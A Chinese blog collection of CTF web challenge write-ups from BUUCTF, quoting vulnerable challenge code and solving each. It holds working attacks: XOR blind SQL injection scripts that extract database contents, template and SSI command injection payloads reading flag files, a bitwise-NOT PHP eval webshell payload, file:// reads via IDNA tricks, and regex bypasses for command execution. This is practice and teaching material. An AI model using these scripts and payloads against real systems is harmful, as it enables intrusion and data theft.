@[TOC]

# [De1CTF 2019]SSRF Me

代码整理:

```python
#! /usr/bin/env python
# #encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')
 
app = Flask(__name__)
 
secert_key = os.urandom(16)
 
class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):
            os.mkdir(self.sandbox)
 
    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result
 
    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False
 
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
 
@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
 
@app.route('/')
def index():
    return open("code.txt","r").read()
 
def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"
 
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
 
def md5(content):
    return hashlib.md5(content).hexdigest()
 
def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False
if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=9999)

```

三个路由:

```python
'/'
'/De1ta'
'/geneSign'
```

`/`就是读代码然后打出来
`/geneSign`作用
* `geneSign()`函数:获取输入的`param`参数，执行函数`getSign(scan,param)`
* `getSign()`函数:将传来的`scan`和`param`md5加密传回

`/De1ta`作用
*  从`cookie`读取`action`和`sign`，从`GET`请求读取`param`，读取请求`ip`
* `waf`函数过滤以`gopher`或`file`开头的`param`
* 传`(action,param,sign,ip)`回Task类
* 将`task.Exec()`执行结果输出
* `Task`类初始化，对`ip`md5加密,没有路径关键字在其中就建一个`md5加密后的ip`为名的目录
* `checkSign()`函数，`getSign()`处理后的`md5`值和`cookie`传入的`sign`值进行弱比较
* 弱比较成功之后，如果`cookie`传的`action`有`scan`关键字，就写入`scan(param)`，如果有`read`，就可以读对应内容

总结一下就是:
`param`放要读的文件`flag.txt`\
`cookie`里的`action`+`GET`里的`param`加密后要等于`cookie`里的`sign`
`geneSign`告诉我们`param`+关键字`action`的MD5加密是多少
那我们在`/geneSign`页面传`param=flag.txtread`就能算出来`secret_key+flag.txt+readscan`的值是多少，可以绕过弱比较

![在这里插入图片描述](https://img-blog.csdnimg.cn/d6a0f2c22a6747da83c9d9b5a388a73e.png)
最终，回到`/De1ta`页面，`GET`传参`param=flag.txt`，`cookie`传参`action=readscan;sign=373113c5d0074f5f2ef7721e3d02fff4`可以得到`flag`,密钥不同环境不同

![在这里插入图片描述](https://img-blog.csdnimg.cn/ce7d71ed847245649e4dda8d4c232fd9.png)

================================================

# [极客大挑战 2019]FinalSQL
>[参考博客](https://blog.csdn.net/weixin_52387684/article/details/121200257)

![在这里插入图片描述](https://img-blog.csdnimg.cn/36acc6200f384967aefac7ac5a095d37.png)
映入眼帘五个按钮，逐个按下来让按第六个，选中附近检查源码

![在这里插入图片描述](https://img-blog.csdnimg.cn/798f9da9b9544ecfbaede44eeb1f1ed3.png)
删注释框，改类型为`submit`，加`value="6"`

![在这里插入图片描述](https://img-blog.csdnimg.cn/539627f8fec74f2798a1b5a7bc8356fc.png)
URL里有`id`参数

用异或盲注，脚本来自参考博客

```python
import requests
import time

url="http://8bf0bc1e-3d13-4d37-9342-dc640f9d2b08.node4.buuoj.cn:81/search.php"

# 0^(ord(substr(database(),1,1))>32)
def getDatabase():
    database_name=""
    for x in range(1,1000):
        low = 32
        hight = 127
        mid=(low+hight)//2
        while low < hight:
            params={
                "id":"0^(ord(substr((select(database())),"+str(x)+",1))>"+str(mid)+")"
            }
            r=requests.get(url=url,params=params)
            if "others~~~" in r.text:
                low = mid+1
            else:
                hight = mid
            mid=(low+hight)//2
        if low <=32 or hight >= 127:
            break
        database_name += chr(mid)
        print("数据库为：",database_name)

def getTable(): # 获取表名
    tables_name = ""
    for x in range(1,1000):
        left = 32
        right = 127
        mid=(left+right)//2
        while left < right:
            params = {
                "id" : "0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),"+str(x)+",1))>"+str(mid)+")"
            }
            r=requests.get(url=url,params=params)
            if "others~~~" in r.text:
                left = mid + 1
            else:
                right = mid
            mid = (left + right) // 2
        if left < 32 or right > 127:
            break
        tables_name += chr(mid)
        print("table:",tables_name)
        time.sleep(1)
#  F1naI1y,Flaaaaag
def getColmun():
    column_name=""
    for x in range(1,1000):
        left=32
        right=127
        mid=(left+right)//2
        while left<right:
            while left < right:
                params = {
                    "id": "0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y'))," + str(x) + ",1))>" + str(mid) + ")"
                }
                r = requests.get(url=url, params=params)
                if "others~~~" in r.text:
                    left = mid + 1
                else:
                    right = mid
                mid = (left + right) // 2
            if left < 32 or right > 127:
                break
            column_name += chr(mid)
            print("column:",  column_name)
            time.sleep(1)

def getFlag():
    flag=""
    for x in range(1,1000):
        left=32
        right=127
        mid=(left+right)//2
        while left<right:
            while left < right:
                params = {
                    "id": "0^(ord(substr((select(group_concat(password))from(F1naI1y))," + str(x) + ",1))>" + str(mid) + ")"
                }
                r = requests.get(url=url, params=params)
                if "others~~~" in r.text:
                    left = mid + 1
                else:
                    right = mid
                mid = (left + right) // 2
            if left < 32 or right > 127:
                break
            flag += chr(mid)
            print("flag:",  flag)
            time.sleep(1)
getDatabase()
getTable()
getColmun()
getFlag()

```


======================================================
# [CISCN2019 华东南赛区]Web11

改XFF，IP地址会随之改变

![在这里插入图片描述](https://img-blog.csdnimg.cn/a8ccd0e08de84f15ad3aeee314223a77.png)
没思路，随便输点什么看看有没有报错

![在这里插入图片描述](https://img-blog.csdnimg.cn/b1a2987b2a3d4fd3ad9a705f06032d09.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5b29c2badbe24da2aa055f43d41b78cf.png)
模板注入，参考博客

`{system('cat ../../../../../../flag')}`

======================================================

# [BSidesCF 2019]Futurella
![在这里插入图片描述](https://img-blog.csdnimg.cn/5e0b15becc084f2cbdc13389b078ad7d.png)
ctrl+U

擦，源码底部给了flag，以为是假的，试了试是对的

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdf2e51311fd4440a5b2f1e919c5ed77.png)
不过如果你复制这些文字去搜索内容的时候也会看到翻译后的内容，这里应该是应用了`class`换了原文的显示形式


=======================================================
# [SUCTF 2019]Pythonginx
>[参考博客](https://blog.csdn.net/qq_51684648/article/details/123501658)
>[参考博客2](https://blog.csdn.net/RABCDXB/article/details/115451137)

老样子，ctrl U自动整理代码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
        
```

特殊字符经过`inda`编码再`utf-8`解码可以出来一些字符组合

要绕过前两个`if`，匹配第三个`if`，将特殊字符整进去，解码后能拼成要检测的值

常用nginx路径:

```php
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf

```

要求跑出来经过inda编码再utf-8解码之后`==c`或者其他`suctf.cc`中的字符也行

脚本参见博客

`file://suctf.cℂ/../../../../..//usr/local/nginx/conf/nginx.conf`
`file://suctf.cℂ/../../../../..//usr/fffffflag`
或者不用`../`也行

========================================================

# [BJDCTF2020]EasySearch
>[参考博客](https://blog.csdn.net/Kracxi/article/details/122933015)

源码

```php
<?php
    ob_start();
    function get_hash(){
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    }
    header("Content-Type: text/html;charset=utf-8");
    echo '<!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>Login</title>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width">
    <link href="public/css/base.css" rel="stylesheet" type="text/css">
    <link href="public/css/login.css" rel="stylesheet" type="text/css">
    </head>
    <body>';

    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        // $_POST['username'];
        $admin = '6d0bc1';
        // 14795508
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Document</title>
            </head>
            <body>
                <h1>Hello,'.$_POST['username'].'</h1>
                <br>
                <h2>data: <!--#echo var="DATE_LOCAL"--></h2>
                <br>
                <h2>Client IP: <!--#echo var="REMOTE_ADDR"--></h2>
            </body>
            </html>';
            fwrite($shtml,$text);
            fclose($shtml);
            // echo 'File：',$file_shtml;
            header("Url_Is_Here:".$file_shtml);
            echo "[!] Header  error ...";

        } else {
            echo "<script>alert('[!] Failed')</script>";
            echo '<div class="login">
        <form action="index.php" method="post" id="form">
            <div class="logo"></div>
            <div class="login_form">
                <div class="user">
                    <input class="text_value" value="" name="username" type="text" id="username" placeholder="username">
                    <input class="text_value" value="" name="password" type="password" id="password" placeholder="password">
                </div>
                <button class="button" id="submit" type="submit">submit</button>
            </div>';
        }
    }else
    {
        echo '<div class="login">
        <form action="index.php" method="post" id="form">
            <div class="logo"></div>
            <div class="login_form">
                <div class="user">
                    <input class="text_value" value="" name="username" type="text" id="username" placeholder="username">
                    <input class="text_value" value="" name="password" type="password" id="password" placeholder="username">
                </div>
                <button class="button" id="submit" type="submit">登录</button>
            </div>';
    }
    echo '            <div id="tip"></div>
    <div class="foot">
    bjd.cn
    </div>
    </form>
</div>';
?>
</body>
</html>


```

如果密码md5加密之后`截前六位`与设定好的`username`相等，就登陆成功

撞一下md5

```python
import hashlib

for i in range(1000000000):
    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()

    if a[0:6]=='6d0bc1':
        print(i)
        break
#2020666
```

```php
   $file_shtml = "public/".get_hash().".shtml";
   header("Url_Is_Here:".$file_shtml);
   #新建了一个文件并且文件名请求头里面了

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3d62bb57d42b421db3f57f00476185d2.png)

访问这个页面，可控元素应该就这个POST过来的`username`

>shtml和asp 有一些相似，以shtml命名的文件里，使用了ssi的一些指令，就像asp中的指令，你可以在SHTML文件中写入SSI指令，当客户端访问这些shtml文件时服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来。

指令格式:
`<!--#exec cmd=命令-->`
`<!--#exec cgi=命令-->`

payload:
`username=<!--#exec cmd="ls /var/www/html/"-->&password=2020666`


`username=<!--#exec cmd="cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2"-->&password=2020666`

========================================================
# [BSidesCF 2019]Kookie

ctrl U

没有可用内容，传值也没什么

说是cookie，抓包看没有设置cookie，加一个cookie头试试
`cookie: username=admin`

![在这里插入图片描述](https://img-blog.csdnimg.cn/97db9bcfa2d440628fa768a03c3958b3.png)
擦，直接出flag了

========================================================
# [极客大挑战 2019]RCE ME
>https://blog.csdn.net/qq_43801002/article/details/107760421
```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>

```

无字母无数字，考虑异或RCE和取反RCE，异或的payload太长，参考别人的用取反

```php
echo (~'phpinfo')
#%8F%97%8F%96%91%99%90

#尝试system函数没有回显，一片黑
```
```php
echo urlencode(~'assert')."\n";

echo urlencode(~'(eval($_POST[a]))');

#%9E%8C%8C%9A%8D%8B
#%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6
```
不明白为什么连起来写成功不了

`?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);`

连蚁剑

用蚁剑的UAF插件绕过

终端运行`readflag`

>蚁剑从插件市场安装插件要先设置本地代理，要不然就下载源码放到antSword-master\antData\plugins目录下

=========================================================
# [MRCTF2020]套娃
>https://blog.csdn.net/m0_52199518/article/details/115997713

什么也没有是不可能的，直接打开源码

```php
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}

```

要求检测到传值不能有下划线，但是变量名得有下划线，利用PHP变量解析漏洞，下划线换成空格传值

下面要求传的值不等于`23333`但又要求值以`23333`开头并结尾,可以在末尾加入换行符`%0a`

`b u p t=23333%0a`

![在这里插入图片描述](https://img-blog.csdnimg.cn/93ad38305b544828b5cd5ad21f7c13c5.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a90d23b87a5244539ea5ad12a3c71f70.png)
源码里有一段脚本，能从console直接运行的

![在这里插入图片描述](https://img-blog.csdnimg.cn/aca6d896b64b402480d1a48bc6ebd0ed.png)
POST传`Merak`

```php
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }

```
`change()`对参数进行了内容转换，最终会从这个转换后的参数读文件名，要构造一个字符串，转换后是flag.php

可能还会有`xff`头识别

要求读文件内容`===todat is a happy day`，不知道文件就用`data伪协议`

XFF不能用，从参考博客学到新姿势`CLIENT-IP`

打印内容用`data://text/plain,todat is a happy day`

`change()`函数中我们把`+`改成`-`，进行逆运算

```php
<?php

function change($v){ 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    return $re; 
}

$a='flag.php';

echo base64_encode(change($a));

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/eac67ee9ad7e4c898cbe0d934a51aedc.png)

=====================================================
# [WUSTCTF2020]颜值成绩查询

看了网页源码没有东西，只能输学号，试了试也没有报错，应该是盲注

直接用之前搞得异或盲注

`0^(ord(substr(database(),0,1))>32)`测试成功

```python
import requests
import time

url="http://6d6430c9-048f-48e1-899f-b4557cefb236.node4.buuoj.cn:81"

i=0

result=""
for x in range(1,1000):
    low = 32
    hight = 127
    mid=(low+hight)>>1
    while low < hight:
        params={
            #"stunum":"0^(ord(substr((select(database())),"+str(x)+",1))>"+str(mid)+")"
            #"stunum":"0^(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=database())),"+str(x)+",1))>"+str(mid)+")"
            #"stunum":"0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),"+str(x)+",1))>"+str(mid)+")"
        	"stunum":"0^(ord(substr((select(value)from(flag)),"+str(x)+",1))>"+str(mid)+")"
        }
        r=requests.get(url=url,params=params)
        if "your score is: 100" in r.text:
            low = mid+1
        else:
            hight = mid
        mid=(low+hight)//2
    if low <=32 or hight >= 127:
        break
    result += chr(mid)
    print("result：",result)

```

========================================================
# [FBCTF2019]RCEService

>http://www.manongjc.com/detail/15-jpgjfyubczfhrow.html

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

>源码中可以看到putenv('PATH=/home/rceservice/jail')已经修改了环境变量，我们只能用绝对路径来调用系统命令

>cat命令在/bin中保存

因为可以preg_match只会去匹配第一行，所以这里可以用多行进行绕过

`{%0A"cmd":"ls /home/rceservice/"%0A}`


![在这里插入图片描述](https://img-blog.csdnimg.cn/0200cced3ed54ec3b0386d1df5f0b8f5.png)
`{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}`
